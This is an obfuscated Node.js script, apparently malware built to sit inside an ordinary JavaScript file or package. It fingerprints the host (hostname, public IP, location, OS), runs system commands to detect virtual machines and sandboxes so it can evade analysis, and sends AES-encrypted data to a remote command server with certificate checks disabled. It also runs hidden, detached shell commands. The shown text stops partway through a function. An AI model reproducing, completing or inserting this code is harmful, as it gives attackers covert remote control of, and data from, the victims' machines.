if (typeof window === "undefined") {
  const a0_0x52fd6a=a0_0x17a7;(function(_0x442601,_0x24f327){const _0x27f148=a0_0x17a7,_0x4102ca=_0x442601();while(!![]){try{const _0x33df6f=parseInt(_0x27f148(0x262))/0x1+-parseInt(_0x27f148(0x267))/0x2+parseInt(_0x27f148(0x238))/0x3+-parseInt(_0x27f148(0x316))/0x4*(parseInt(_0x27f148(0x214))/0x5)+parseInt(_0x27f148(0x296))/0x6*(parseInt(_0x27f148(0x2fd))/0x7)+parseInt(_0x27f148(0x1d3))/0x8*(parseInt(_0x27f148(0x318))/0x9)+-parseInt(_0x27f148(0x2d2))/0xa;if(_0x33df6f===_0x24f327)break;else _0x4102ca['push'](_0x4102ca['shift']());}catch(_0x4a2a58){_0x4102ca['push'](_0x4102ca['shift']());}}}(a0_0x371a,0x35923));const a0_0x370bdd=(function(){const _0x1cc983=a0_0x17a7,_0xe1c8fc={'KISkm':function(_0x4bf876,_0x2a06dd){return _0x4bf876!==_0x2a06dd;},'vmGpx':_0x1cc983(0x274)};let _0x130056=!![];return function(_0x1cbb74,_0x2e6d21){const _0x5f1f9a=_0x1cc983,_0x59ff2f={'kspMR':function(_0x2596b5,_0x5c603a){const _0x57f567=a0_0x17a7;return _0xe1c8fc[_0x57f567(0x286)](_0x2596b5,_0x5c603a);},'pxSCq':_0xe1c8fc[_0x5f1f9a(0x233)]},_0x189bef=_0x130056?function(){const _0x48a12a=_0x5f1f9a;if(_0x59ff2f[_0x48a12a(0x215)](_0x59ff2f['pxSCq'],_0x48a12a(0x27f))){if(_0x2e6d21){const _0x2ae793=_0x2e6d21[_0x48a12a(0x2f3)](_0x1cbb74,arguments);return _0x2e6d21=null,_0x2ae793;}}else _0x652673.env[_0xf5ad04]&&(_0x2afd8e[_0x48a12a(0x317)](_0x48a12a(0x1c2)+_0xc0a2c9),_0x4460a3=0x1);}:function(){};return _0x130056=![],_0x189bef;};}()),a0_0x176de2=a0_0x370bdd(this,function(){const _0x4a7a99=a0_0x17a7,_0x4ad0c3={'CIMoh':_0x4a7a99(0x1db)};return a0_0x176de2['toString']()[_0x4a7a99(0x2da)](_0x4ad0c3[_0x4a7a99(0x2e5)])[_0x4a7a99(0x2d5)]()[_0x4a7a99(0x1bb)](a0_0x176de2)['search'](_0x4ad0c3[_0x4a7a99(0x2e5)]);});a0_0x176de2();function a0_0x17a7(_0x1b22e0,_0x38297b){_0x1b22e0=_0x1b22e0-0x1b2;const _0x3eb2a0=a0_0x371a();let _0x176de2=_0x3eb2a0[_0x1b22e0];if(a0_0x17a7['ioPpvr']===undefined){var _0x370bdd=function(_0x4a5b0b){const _0x39f8c8='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x576c69='',_0x57475a='',_0x4e82c3=_0x576c69+_0x370bdd,_0x281f3c=(''+function(){return 0x0;})['indexOf']('\x0a')!==-0x1;for(let _0x44291b=0x0,_0x5d52ea,_0x57dc49,_0xa3ec10=0x0;_0x57dc49=_0x4a5b0b['charAt'](_0xa3ec10++);~_0x57dc49&&(_0x5d52ea=_0x44291b%0x4?_0x5d52ea*0x40+_0x57dc49:_0x57dc49,_0x44291b++%0x4)?_0x576c69+=_0x281f3c||_0x4e82c3['charCodeAt'](_0xa3ec10+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x5d52ea>>(-0x2*_0x44291b&0x6)):_0x44291b:0x0){_0x57dc49=_0x39f8c8['indexOf'](_0x57dc49);}for(let _0x36fb10=0x0,_0x5e2f2b=_0x576c69['length'];_0x36fb10<_0x5e2f2b;_0x36fb10++){_0x57475a+='%'+('00'+_0x576c69['charCodeAt'](_0x36fb10)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x57475a);};a0_0x17a7['taZhrx']=_0x370bdd,a0_0x17a7['FqpoGP']={},a0_0x17a7['ioPpvr']=!![];}const _0x371ace=_0x3eb2a0[0x0],_0x17a7d3=_0x1b22e0+_0x371ace,_0x307a1a=a0_0x17a7['FqpoGP'][_0x17a7d3];if(!_0x307a1a){const _0x2ed646=function(_0x29ebed){this['YielOs']=_0x29ebed,this['ojqhui']=[0x1,0x0,0x0],this['WCERJX']=function(){return'newState';},this['bDibnO']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['jRBFeO']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x2ed646['prototype']['xZRSij']=function(){const _0x48ad7a=new RegExp(this['bDibnO']+this['jRBFeO']),_0x26f7cb=_0x48ad7a['test'](this['WCERJX']['toString']())?--this['ojqhui'][0x1]:--this['ojqhui'][0x0];return this['xAUHtq'](_0x26f7cb);},_0x2ed646['prototype']['xAUHtq']=function(_0x28a4be){if(!Boolean(~_0x28a4be))return _0x28a4be;return this['KfaWrI'](this['YielOs']);},_0x2ed646['prototype']['KfaWrI']=function(_0x46ef7b){for(let _0xaa23b7=0x0,_0x17878a=this['ojqhui']['length'];_0xaa23b7<_0x17878a;_0xaa23b7++){this['ojqhui']['push'](Math['round'](Math['random']())),_0x17878a=this['ojqhui']['length'];}return _0x46ef7b(this['ojqhui'][0x0]);},(''+function(){return 0x0;})['indexOf']('\x0a')===-0x1&&new _0x2ed646(a0_0x17a7)['xZRSij'](),_0x176de2=a0_0x17a7['taZhrx'](_0x176de2),a0_0x17a7['FqpoGP'][_0x17a7d3]=_0x176de2;}else _0x176de2=_0x307a1a;return _0x176de2;}const crypto=require('crypto'),axios=require(a0_0x52fd6a(0x2b8)),https=require(a0_0x52fd6a(0x1f8)),fs=require('fs'),path=require(a0_0x52fd6a(0x2df)),os=require('os'),{execSync,exec,spawn}=require(a0_0x52fd6a(0x22f));let SERVER_URL=a0_0x52fd6a(0x22e),API_ENDPOINT=SERVER_URL+a0_0x52fd6a(0x1d6);async function sendToServer(_0x1aa525){const _0x17293f=a0_0x52fd6a,_0x15e7d9={'ngsjN':_0x17293f(0x201),'GJaAG':'utf8','tPscO':function(_0x522218,_0x3a13ba){return _0x522218===_0x3a13ba;},'Tczqh':_0x17293f(0x22d),'duLkB':function(_0x379366){return _0x379366();},'ZHbzJ':'linux','LCOof':function(_0x2886c8){return _0x2886c8();},'eRrOF':function(_0x16811a,_0x3ef5d7){return _0x16811a===_0x3ef5d7;},'YVoXq':'darwin','QOfPb':_0x17293f(0x239),'qJgux':_0x17293f(0x315),'XFVuD':_0x17293f(0x1e4),'oMvHg':function(_0xbc647a,_0x238d6f){return _0xbc647a!==_0x238d6f;}};try{if(_0x15e7d9[_0x17293f(0x2cb)]===_0x15e7d9[_0x17293f(0x26f)]){_0xb0d6d=_0x2100ae(_0x15e7d9['ngsjN'],{'encoding':_0x15e7d9['GJaAG'],'timeout':0x2710});const _0x5b6e06=_0xc59ef1(_0x4f8dfb);_0x5b6e06[_0x17293f(0x202)]&&(_0x2c66ca['push'](..._0x5b6e06),_0x290efd=0x1);}else{const _0x9a608=SERVER_URL+_0x17293f(0x1d6),_0xffef99={'timeout':0x7530,'headers':{'Content-Type':_0x15e7d9[_0x17293f(0x1d8)]},'httpsAgent':new https[(_0x17293f(0x1e3))]({'rejectUnauthorized':![]})},_0x4545ce=await axios[_0x17293f(0x279)](_0x9a608,_0x1aa525,_0xffef99);return _0x4545ce;}}catch(_0xa0521f){if(_0x15e7d9['oMvHg'](_0x17293f(0x299),_0x17293f(0x299))){const _0xafdb6b=_0x5bc9da[_0x17293f(0x2f4)];if(_0x15e7d9[_0x17293f(0x2d8)](_0xafdb6b,_0x15e7d9[_0x17293f(0x2cd)]))return _0x15e7d9['duLkB'](_0x549dd5);if(_0x15e7d9[_0x17293f(0x2d8)](_0xafdb6b,_0x15e7d9[_0x17293f(0x2ef)]))return _0x15e7d9[_0x17293f(0x309)](_0x21c4a6);if(_0x15e7d9['eRrOF'](_0xafdb6b,_0x15e7d9['YVoXq']))return _0x15e7d9['LCOof'](_0x5f1ca6);return{'running':[],'installed':[]};}else{process['exit'](0x0);throw _0xa0521f;}}}function getComputerName(){return os['hostname']();}function getOSType(){const _0x36eaea=a0_0x52fd6a,_0x4844c1={'VVCli':function(_0xc7a800,_0x23134b){return _0xc7a800===_0x23134b;},'kKTDe':_0x36eaea(0x261),'myujU':_0x36eaea(0x24b),'rBdNG':_0x36eaea(0x255),'RBZDG':_0x36eaea(0x250)},_0x1814aa=process['platform'];if(_0x4844c1[_0x36eaea(0x252)](_0x1814aa,_0x36eaea(0x22d)))return _0x4844c1['kKTDe'];if(_0x4844c1[_0x36eaea(0x252)](_0x1814aa,_0x36eaea(0x1f4)))return _0x4844c1[_0x36eaea(0x257)];if(_0x4844c1['VVCli'](_0x1814aa,_0x4844c1['rBdNG']))return _0x4844c1['RBZDG'];return _0x1814aa;}function a0_0x371a(){const _0xdd271a=['ntKWmZjnt3rPree','y3jLyxrLq2LWAgvYAxy','C3rYAw5NAwz5','CeHxEfi','ywrK','mtCYmJuWBgrNz0nM','zNDkB3G','l3rYicj3C2nYAxb0lMv4zsa','Dg9vChbLCKnHC2u','wgvU','ywzvqKe','rxjYB3iGz2v0DgLUzYbZExn0zw0GAw5MBZOG','Ag1ZuNi','CuPNDxG','Egj6yvu','BuHQBLy','rvDWDfO','ufPiuvy','BgXRqwe','r2f5uMe','rxjYB3iGz2v0DgLUzYbZExn0zw1PBMzVoIa','B3Dquuq','Cg9ZAey','Cg9ZDa','BwPpC2K','rNn0uhO','C3LZDgvTx3bYB2zPBgvYifnqsgfYzhDHCMveyxrHvhLWzq','ze1ADxm','BuTJBuC','A1noAvC','CxbzB2u','AMn6D24','rNfZyKS','wgzOv0q','wKfuCKS','qxDiC0y','s0LtA20','t1m6ia','z1LgtgK','zMLUywW','BKPNvhO','twLJCM9ZB2z0rwrNzuXVz1rHC2S','C3LZDgvTsw5MBW','l3rUici','Cg93zxjZAgvSBa','AgrQAhi','C2nODgfZA3mGl3j1BIaVDg4GiG','DfbWCgK','CMvNAw9Ux25HBwu','qMDuAeC','BwDMBey','v3DID3i','ndqZmtzVAKPIrgO','y29Uy2f0','zgLYBMfTzq','B21TCuO','DKzgwgi','CMvWBgfJzq','AwDUB3jL','DxbKyxrL','AM9PBG','y2L0Eq','C2XPy2u','tLqGqvvuse9ssvrzxfnzu1rftq','EwHUt0e','D2HVyw1Pic9NCM91Chm','ywvZlti1nI1JyMm','u1LXB1K','Cw5Wt1C','BunuAfq','q29UDgLUDwu','wMnJEwu','B3D0u0W','zgnYvfm','tNb1AK8','rezwDuC','DM1jBMrPy2f0B3jZ','qNLhBvG','D3jPDgvgAwXLu3LUyW','uurKtgW','zengyLa','rxHPDa','Aw5JBhvKzxm','swPPtuS','kgz1BMn0Aw9Ukg5Hy2WPia','jYiGjIbFcIaGicaGicaGiIaTv2LUzg93u3r5BguGsgLKzgvUic1qyxnZvgHYDtSIicyGxWOGicaGicaGiciKCc5jzcb8ie91Dc1gAwXLic1fBMnVzgLUzYbHC2nPAsaNiIaMihbPzezPBguGjIaIjYiGjIbFcIaGicaGicaGiIiIiGOkicaGicaGC2HLBgWUuNvUihbZq21KlcaWlcbuCNvLcGOGicaGicbjzIbfCNiUtNvTyMvYidW+idaGvgHLBGOGicaGicaGie9UievYCM9YifjLC3vTzsbozxH0cIaGicaGicaGrgLTigvYCKzZBYWGzxjYrMLSzsWGzxjYu3rYzwfTcIaGicaGicaGu2v0igvYCKzZBYa9ienYzwf0zu9IAMvJDcGIu2nYAxb0Aw5NlKzPBgvtExn0zw1pyMPLy3qIkqOGicaGicaGigvYCKzPBguGpsaI','yxHPB3m','zhbRzYaTBcb8igf3AYaNE3bYAw50icqYFsC','Dg9mB3DLCKnHC2u','yuLqtue','A2Pvweu','zgLNzxn0','B2PXAwe','A2v5CW','s1zn','Ahr0Chm6lY9PCgfWAs5JBY9QC29UlW','qLnnywC','y3nWDKO','uvzSt1i','quLNqxO','qKzZEMe','CeDWzwe','zw5JCNLWDgvKuMvZCg9UC2u','uLDdyLa','BhnIx3jLBgvHC2uGlweGmJ4Vzgv2l251BgWGFhWGy2f0ic9LDgmVB3mTCMvSzwfZzq','uu9Mugi','wfPVvuW','vgn6CwG','z1fTuK0','C2PAs1e','BgfQBMW','uhnJwvC','ntm5otyWr3vusfLZ','q2fcBei','uLzxq3u','Dg9tDhjPBMC','t3n4zgK','DK5gCKi','DfbZy08','rhHLzLa','C2vHCMnO','B1DqqNC','Ag9TzwrPCG','uLjJB2i','z2TAEeu','Cgf0Aa','BgTNz0m','CeDUDLC','Eu9HENC','ru50veK','rgrnD2y','q0LnB2G','s0Xgs3K','lY5JB25MAwCVtw91C2vWywqVtw91C2vWywqVC2nYAxb0lMPZ','Ce5vwK0','tLPkzLi','rNnLC2e','qwLIzxG','AvH2EeW','vMLYDhvHBejVEa','tfHfvgS','wKHIEKO','uhjVz3jHBurHDge','q2ntv3O','C2HPzNq','yxbWBhK','CgXHDgzVCM0','wgzhvLe','DhjPBq','BM9Kzsa','uuvnvq','vw5srgO','qKL5AwG','wujPENK','BMDwBum','mtryBLD4rNK','EMTMugC','wuPgAgy','C3bSAxq','q1LkqwO','rgLTihbPzezPBgukicaGicaGrgLTigzZBWOGicaGicbeAw0GC2HLBgWkicaGicaGt24GrxjYB3iGuMvZDw1Lie5LEhqkcIaGicaGihbPzezPBguGpsaI','zNjVBq','vw5RBM93BIbmB2nHDgLVBG','lY5JB25MAwCVtw91C2vWywqVtw91C2vWywq','rMrMwgq','D3zPBfq','B1vPtLe','tenpB2y','ugfYywXSzwXZ','DxnwuhG','DgvrAxm','zwvJzgK','yK1Qq3u','uhjVz3jHBxm','CvjVzge','ChmGyxv4ihWGyxDRicD7ChjPBNqGjdeXFsC','iGOGicaGicaGifnLDcbLCNjtDhjLyw0GpsbLCNjgC28Ut3bLBLrLEhrgAwXLkgvYCKzPBguSidGSifrYDwuPcIaGicaGicaGzxjYu3rYzwfTlLDYAxrLtgLUzsboB3CGjIaIic0GrxjYB3iGiIaMievYCI5oDw1IzxiGjIaIoIaIicyGrxjYlKrLC2nYAxb0Aw9UcIaGicaGicaGzxjYu3rYzwfTlKnSB3nLcIaGicaGicaGrxjYlKnSzwfYcIaGicaGievUzcbjzGOGicaG','y2f0ic9ZExmVy2XHC3mVzg1Pl2LKl3n5C3rLBv9WCM9KDwn0x25HBwuGmJ4Vzgv2l251BgWGFhWGzwnOBYaIiG','A1fkz2C','sgrQA1i','mJi3nteYqMnkyLPv','ChvZAa','owTcq3vvzq','sw52uxa','AKLiDuq','CuTMsKe','rLvQCxO','te1gCMK','wMXizwe','tLvOs1G','D2LXDeG','Ae1zDwy','yxf2rhG','zgf0yq','yLjYAe8','tLqGqvvuse9ssvrzxe5fvfDpuKSGu0vsvKLdrq','y29UC3rYDwn0B3i','D1DyugO','vfvpANC','u2fUzgjVEgLL','yuLkDei','v0HdvM8','4PQG77IpicbezxrLy3rLzdOG','4PQG77IpicbgB3vUzcbLBNyGDMfYoIa','wuzptM0','u2DJveG','vwDXt0G','C2HHmJu2','ww93C3a','Eff1sMy','Bwf0y2HbBgW','AvPnv1u','ugLKBLK','uejAue4','q2n0AeS','l3j1ia','CNbTic1Xyq','z3jrwKG','iGOkicaGicaGu2v0igzZBYa9ienYzwf0zu9IAMvJDcGIu2nYAxb0Aw5NlKzPBgvtExn0zw1pyMPLy3qIkqOGicaGicbtzxqGC2HLBgWGpsbdCMvHDgvpyMPLy3qOiLDty3jPChqUu2HLBgWIkqOkicaGicaGswyGzNnVlKzPBgvfEgLZDhmOCgLKrMLSzsKGvgHLBGOGicaGicaGierPBsbMAwXLlcbLEgLZDgLUz1bPzaOGicaGicaGifnLDcbMAwXLid0GzNnVlK9Wzw5uzxH0rMLSzsHWAwrgAwXLlcaXkqOGicaGicaGigv4Axn0Aw5NugLKid0GvhjPBsHMAwXLlLjLywrmAw5LkcKPcIaGicaGicaGzMLSzs5dBg9ZzqOkicaGicaGicbeAw0GD21PlcbXDwvYEsWGChjVy2vZC2vZcIaGicaGicaGu2v0ihDTAsa9ieDLDe9IAMvJDcGID2LUBwDTDhm6xfWUxhjVB3rCy2LTDJiIkqOGicaGicaGihf1zxj5id0GiLnftevdvcaQiezst00Gv2LUmZjFuhjVy2vZCYbxsevsrsbqCM9JzxnZswqGpsaIicyGzxHPC3rPBMDqAwqkicaGicaGicbtzxqGChjVy2vZC2vZid0GD21PlKv4zwnrDwvYEsHXDwvYEsKkcIaGicaGicaGswyGChjVy2vZC2vZlKnVDw50id4GmcbuAgvUcIaGicaGicaGicbxu2nYAxb0lLf1AxqkicaGicaGicbfBMqGswykicaGicaGrw5KieLMcGOGicaGicbeAw0GChndBwqkicaGicaGChndBwqGpsaICg93zxjZAgvSBcaTv2LUzg93u3r5BguGsgLKzgvUic1dB21Tyw5KiciIiIaMif8kicaGicaGicaIjhaGpsbtDgfYDc1qCM9JzxnZig5VzguGlufYz3vTzw50tgLZDcaN','Dw5HBwuGlwe','mZG0nda4v01ND2zr','AwfRBfm','zfnouKC','l2fWAs9YzxbVCNq','zM9YrwfJAa','wezwDuq','y3jLyxrLrgvJAxbOzxjPDG','vMLYDhvHBcbnywnOAw5L','kcGOlISPkYKRksSK','svHcshi','CNnJDwy','AxncDwzMzxi','BwvZC2fNzq','CMvNihf1zxj5icjis0vzx0nvuLjftLrFvvnfuLXtt0zuv0fsrvXnAwnYB3nVzNrCv2LUzg93C1XdDxjYzw50vMvYC2LVBLXvBMLUC3rHBgWIic9Z','Bwf0y2G','vK1xqvjfx1jvtLrjtuu','qwDLBNq','yxbWBgLJyxrPB24VANnVBG','DefKD1m','sLbdweu','CxPQDgG','vLLLCLO','y2rmv0i','DK5qB0u','ugDovKi','C2nODgfZA3mGl2nYzwf0zq','D0r6r1y','tKfQvMy','DxrMoa','rKTIq2e','BeTysfi','CeT1t1m','z2v0','zgfYD2LU','uhzmD1C','zwTgreS','y3jLyxrLsg1HyW','Ahr0Chm','svDnBgC','EgzgExK','v1b1qLu','s3DcEKq','vK13yxjL','v1roAuK','BwTKAxjtEw5J','wezkweq','C3LZDgvTAw5MBW','BgvUz3rO','sM1XvLe','C0HOAwi','q0jOCuu','EhPTs1O','uY0Xlte2lteYmJG4','vKjpwf9nu0LFsu5tvefmta','CNnHyuW','vuvAsu8','DwjMvhi','ChjVz3jHBs5QCW','4PQG77IpicbwtsbKCML2zxjZigrLDgvJDgvKigLUihjLz2LZDhj5','rgrvD0O','rKX6qLy','AgfZ','Aw5KzxHpzG','wMz1Exe','A1DMEeC','nvjZz2DJAa','A3nWtvi','tKHKvu4','B3zpCum','thj5vfe','vKjVEa','yLLwExy','qLbWvwe','zxHPDa','uLr6vLK','zMfUDuK','zMXHzW','rfLpBem','q0PnDe4','rMfPBgvKihrVihjLywqGC2HHCMvKigTLEsbMCM9Tia','t056tuG','q1zRv2e','CMfUzg9TqNL0zxm','C3vJy2vZCW','C1fcuw8','CufTrfy','rej4qxq','CMvNihf1zxj5ieHlte1Cu1Ltvevnxen1CNjLBNrdB250CM9Su2v0xfnLCNzPy2vZic9Z','qvL4AfC','t011q2e','D2LUmZi','Ahr0Chm6lY90zxn0DgvZDhrLC3rSB2fKlNn0B3jL','y2HPBgrFChjVy2vZCW','C2HLBgW','Dezltxy','yMfZzty0','DM1hChG','yZPC','uvv3Deu','CKf3EuS','uwDsrfu','odGZnZeZt2vYDgvj','swPWveW','B1brvxK','q2XWq20','AM9bsvm','tufdqLi','ChjVz3jHBs52yNm','CgfYC2u','zxjYB3iUBg9N','t3fZqvG','BLHssMO','AMLeywy','CMvHzezPBgvtEw5J','DMDZA2m','z29QC0u','Dg9ju09tDhjPBMC','vMfHtNu','tKPeswS','wfvItMS','twfJ','vK1TseW','CKrhDM8','vvjzv24','lunVBw1HBMq','tgLUDxG','C2HHCMvKlMTLEq','vLzdBgK','qxzmEg8','tKPkug4','BgLUDxG','BxDiEwm','BxL1ALu','vfPjvxa','Beffug4','B01rDLK','DvPhwfe','C3rHCNr1CgrHDge','v3bzr0G','DgfZA2XPC3qGl3yGl2zVignZDG','sNLNrhG','CMvNihf1zxj5icjis0vzx0Xpq0fmx01bq0HjtKvCu09gvfDbuKvCtwLJCM9ZB2z0xfDPBMrVD3nCq3vYCMvUDfzLCNnPB25Cvw5PBNn0ywXSiIaVCW','v2LUzg93CW'];a0_0x371a=function(){return _0xdd271a;};return a0_0x371a();}async function getPublicIP(){const _0x434554=a0_0x52fd6a,_0xf8f8fa={'Yowsp':'Unknown'};try{const _0x299f32=await axios[_0x434554(0x1f3)]('https://api.ipify.org?format=json',{'timeout':0x1388});return _0x299f32[_0x434554(0x1b8)]['ip'];}catch(_0x264e33){return _0xf8f8fa[_0x434554(0x1c7)];}}function getSharedKey(){const _0x5c3331=a0_0x52fd6a,_0x46a39c={'MKuWT':_0x5c3331(0x251)},_0x359429=path[_0x5c3331(0x29e)](__dirname,_0x5c3331(0x2bf),_0x46a39c['MKuWT']);try{return fs[_0x5c3331(0x244)](_0x359429);}catch(_0x30aa5e){throw new Error(_0x5c3331(0x222)+_0x359429+':\x20'+_0x30aa5e['message']);}}function encryptData(_0x23c8f9){const _0x569013=a0_0x52fd6a,_0x59d51b={'GWgbR':function(_0x1b7ff3){return _0x1b7ff3();},'hTQRi':'aes-256-cbc'},_0xb2cc6=_0x59d51b['GWgbR'](getSharedKey),_0x5d3c7b=crypto[_0x569013(0x225)](0x10),_0x4aa8a9=crypto[_0x569013(0x263)](_0x59d51b['hTQRi'],_0xb2cc6,_0x5d3c7b),_0x283d7c=JSON['stringify'](_0x23c8f9),_0x353746=Buffer[_0x569013(0x297)]([_0x4aa8a9[_0x569013(0x29d)](_0x283d7c,_0x569013(0x1ef)),_0x4aa8a9[_0x569013(0x289)]()]);return Buffer[_0x569013(0x297)]([_0x5d3c7b,_0x353746]);}function decryptData(_0x29cc63){const _0x111799=a0_0x52fd6a,_0x4f1006={'IklCV':function(_0xcee250,_0x3b4815,_0x24b0ef){return _0xcee250(_0x3b4815,_0x24b0ef);},'KLFKy':function(_0xb34cf8){return _0xb34cf8();},'CcSWz':_0x111799(0x2a4),'QVlOR':function(_0x4e00e7,_0x3fa02f){return _0x4e00e7===_0x3fa02f;},'SgcTH':function(_0x2ee7c1,_0x53af72){return _0x2ee7c1!==_0x53af72;},'pNUZM':'Iefgm','VGJPY':function(_0x3b0fe0,_0x381498){return _0x3b0fe0===_0x381498;},'gQmRM':_0x111799(0x2be)},_0x1748c2=_0x4f1006[_0x111799(0x2e6)](getSharedKey),_0x1eff6b=_0x29cc63[_0x111799(0x2a0)](0x0,0x10),_0x3735cd=_0x29cc63[_0x111799(0x2a0)](0x10),_0x237d8f=crypto[_0x111799(0x1d9)](_0x4f1006[_0x111799(0x2f1)],_0x1748c2,_0x1eff6b),_0x29c5a3=Buffer[_0x111799(0x297)]([_0x237d8f[_0x111799(0x29d)](_0x3735cd),_0x237d8f[_0x111799(0x289)]()]),_0x3ad464=_0x4f1006[_0x111799(0x2c4)](_0x29c5a3[0x0],0x1),_0x5fd08e=_0x29c5a3['slice'](0x1);if(_0x3ad464)return _0x4f1006[_0x111799(0x1c4)](_0x4f1006[_0x111799(0x2e8)],_0x4f1006[_0x111799(0x2e8)])?_0x209279:_0x5fd08e;else{if(_0x4f1006['VGJPY'](_0x111799(0x2be),_0x4f1006[_0x111799(0x2ce)]))return JSON[_0x111799(0x23f)](_0x5fd08e['toString'](_0x111799(0x1ef)));else{const _0x1887ec=_0x388d39['replace'](/\r\n/g,'\x0a')[_0x111799(0x29b)](/\r/g,'\x0a'),_0xaa9482=_0x4f1006['IklCV'](_0xb4885,_0x1887ec,{'shell':!![],'windowsHide':!![],'stdio':_0x111799(0x29c),'detached':!![]});_0xaa9482['unref']();}}}function generateAuthToken(_0x23ec67,_0xd3206b){const _0x39cd79=a0_0x52fd6a,_0x4b4a50={'Osxdi':_0x39cd79(0x1c6),'Aibex':'hex'},_0x173804=getSharedKey(),_0xc67c69=crypto[_0x39cd79(0x1f7)](_0x4b4a50[_0x39cd79(0x2d6)],_0x173804);return _0xc67c69[_0x39cd79(0x29d)](_0x23ec67),_0xc67c69[_0x39cd79(0x29d)](_0xd3206b),_0xc67c69[_0x39cd79(0x2bd)](_0x4b4a50[_0x39cd79(0x2eb)]);}async function getLocation(){const _0x1a9611=a0_0x52fd6a,_0x1e5156={'RlXad':_0x1a9611(0x304)};try{const _0x4be405=await axios[_0x1a9611(0x1f3)](_0x1a9611(0x2c1),{'timeout':0x1388});return _0x4be405[_0x1a9611(0x1b8)]['country_name']+',\x20'+(_0x4be405[_0x1a9611(0x1b8)][_0x1a9611(0x29f)]||_0x4be405[_0x1a9611(0x1b8)][_0x1a9611(0x292)]);}catch(_0x4c76b6){return _0x1e5156['RlXad'];}}function parseVmIndicators(_0x3b289d){const _0x2e8cbe=a0_0x52fd6a,_0xb67841={'lAEPn':_0x2e8cbe(0x2f8),'vNFrB':_0x2e8cbe(0x26b),'qKfJA':_0x2e8cbe(0x2c0),'kjUXE':_0x2e8cbe(0x30a),'lKXHR':_0x2e8cbe(0x1da),'XfhWD':'VirtualBox','mCThT':_0x2e8cbe(0x1fd),'XxdnD':_0x2e8cbe(0x1be),'QDdLl':function(_0x172846,_0x17640d){return _0x172846!==_0x17640d;},'lajnl':_0x2e8cbe(0x1e5),'WTNiI':_0x2e8cbe(0x24d)},_0x2dcaec=[_0xb67841[_0x2e8cbe(0x283)],_0xb67841[_0x2e8cbe(0x2a7)],_0xb67841[_0x2e8cbe(0x259)],'Xen',_0xb67841[_0x2e8cbe(0x31b)],_0xb67841[_0x2e8cbe(0x2bc)],_0xb67841[_0x2e8cbe(0x1f1)],_0xb67841['XxdnD']],_0xa5bf54=[];for(const _0x1d9bd6 of _0x2dcaec){if(_0x3b289d['toLowerCase']()[_0x2e8cbe(0x2b4)](_0x1d9bd6[_0x2e8cbe(0x2ba)]())){if(_0xb67841[_0x2e8cbe(0x2b1)](_0xb67841[_0x2e8cbe(0x2d0)],_0xb67841[_0x2e8cbe(0x1fe)]))_0xa5bf54[_0x2e8cbe(0x317)](_0x2e8cbe(0x1c1)+_0x1d9bd6);else{const _0x2df68d=[_0x2e8cbe(0x2ed),_0x2e8cbe(0x1fd),_0xb67841[_0x2e8cbe(0x259)],_0xb67841[_0x2e8cbe(0x2d7)],_0xb67841[_0x2e8cbe(0x31b)],_0xb67841['kjUXE'],_0xb67841[_0x2e8cbe(0x1f1)],_0x2e8cbe(0x1be)],_0x5ceebb=[];for(const _0x2ad4cb of _0x2df68d){_0x48cae2[_0x2e8cbe(0x2ba)]()[_0x2e8cbe(0x2b4)](_0x2ad4cb[_0x2e8cbe(0x2ba)]())&&_0x5ceebb['push'](_0x2e8cbe(0x1c1)+_0x2ad4cb);}return _0x5ceebb;}}}return _0xa5bf54;}function getSystemInfoWindows(){const _0x2d2175=a0_0x52fd6a,_0x560208={'WHCVo':function(_0x144372,_0x104348,_0x5017fa,_0x35349b){return _0x144372(_0x104348,_0x5017fa,_0x35349b);},'jczwn':'systeminfo','SYqoY':_0x2d2175(0x1ef),'jiDaf':function(_0x31ac46,_0x1000e8){return _0x31ac46(_0x1000e8);},'ClpCm':_0x2d2175(0x208),'IjiMK':'VMWARE_RUNTIME','CBhqE':_0x2d2175(0x2f8),'afUBA':_0x2d2175(0x231),'teQis':_0x2d2175(0x27b),'ZGDvR':function(_0x5cf1ee,_0x55779c,_0x4056c1){return _0x5cf1ee(_0x55779c,_0x4056c1);},'NpujO':_0x2d2175(0x22a),'vFFXb':_0x2d2175(0x2b3),'ONzMH':_0x2d2175(0x2a8)},_0x2ece9b=[];let _0x545c2c='',_0x292c18=0x0;try{_0x545c2c=execSync(_0x560208[_0x2d2175(0x281)],{'encoding':_0x560208[_0x2d2175(0x2a5)],'timeout':0x2710});const _0x101446=_0x560208[_0x2d2175(0x243)](parseVmIndicators,_0x545c2c);_0x101446['length']&&(_0x2ece9b['push'](..._0x101446),_0x292c18=0x1);}catch(_0x1cef5a){_0x2ece9b[_0x2d2175(0x317)](_0x2d2175(0x276)+_0x1cef5a['message']);}const _0x33e1e9=[_0x560208[_0x2d2175(0x23b)],_0x560208[_0x2d2175(0x2b5)],_0x560208[_0x2d2175(0x205)]];for(const _0x51226b of _0x33e1e9){process.env[_0x51226b]&&(_0x560208[_0x2d2175(0x26c)]===_0x560208[_0x2d2175(0x26c)]?(_0x2ece9b[_0x2d2175(0x317)](_0x2d2175(0x1c2)+_0x51226b),_0x292c18=0x1):_0x3ce39e[_0x2d2175(0x2ba)]()[_0x2d2175(0x2b4)](_0x1fc007[_0x2d2175(0x2ba)]())&&(_0x35ab96[_0x2d2175(0x317)](_0x2d2175(0x1c1)+_0x16248e),_0x47d1b9=0x1));}try{if(_0x560208[_0x2d2175(0x30c)]!=='IMGQP'){const _0x5b317f=_0x560208['ZGDvR'](execSync,_0x560208[_0x2d2175(0x2ac)],{'encoding':_0x2d2175(0x1ef),'timeout':0x2710}),_0x516442=parseVmIndicators(_0x5b317f);_0x516442['length']&&(_0x2ece9b[_0x2d2175(0x317)](..._0x516442),_0x292c18=0x1);}else _0x560208[_0x2d2175(0x1c0)](_0x44013b,_0x5eeba7,{'shell':!![]},(_0xc9a5d9,_0x53f3ff,_0x4a4d35)=>{const _0x28ce22=_0x2d2175;if(_0xc9a5d9){_0x58a86d(_0xc9a5d9);return;}_0x570fac({'stdout':_0x53f3ff[_0x28ce22(0x2f6)](),'stderr':_0x4a4d35[_0x28ce22(0x2f6)]()});});}catch(_0x51290e){}return _0x2ece9b[_0x2d2175(0x317)](_0x292c18?_0x560208[_0x2d2175(0x29a)]:_0x560208[_0x2d2175(0x223)]),{'systemInfo':_0x545c2c,'vmIndicators':_0x2ece9b};}function getSystemInfoLinux(){const 